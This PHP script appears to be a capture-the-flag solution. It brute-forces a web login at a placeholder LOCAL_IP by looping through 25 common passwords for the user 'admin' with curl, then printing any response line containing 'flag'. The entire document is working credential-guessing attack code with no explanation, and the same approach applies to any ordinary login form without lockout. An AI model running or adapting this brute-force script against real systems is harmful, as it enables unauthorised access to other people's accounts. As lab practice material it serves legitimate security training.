<?php

    $arr = array('123456', "password", "12345678", "qwerty", "abc123", "123456789", "111111", "1234567", "iloveyou", "adobe123", "123123", "Admin", "1234567890", 
    "letmein", "photoshop", "1234", "monkey", "shadow", "sunshine", "12345", "password1", "princess", "azerty", "trustno1", "000000");

    $ch = curl_init();
    $ret = "";
    foreach ($arr as $value) {
        $url = "LOCAL_IP/?page=signin&username=admin&password=" . $value . "&Login=Login#";
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $ret .= curl_exec($ch);
    }
    $arr = explode("\n", $ret);
    foreach ($arr as $value) {
        if (preg_match("/flag/", $value)) {
            echo $value . "\n";
        }
    }
    curl_close($ch);
?>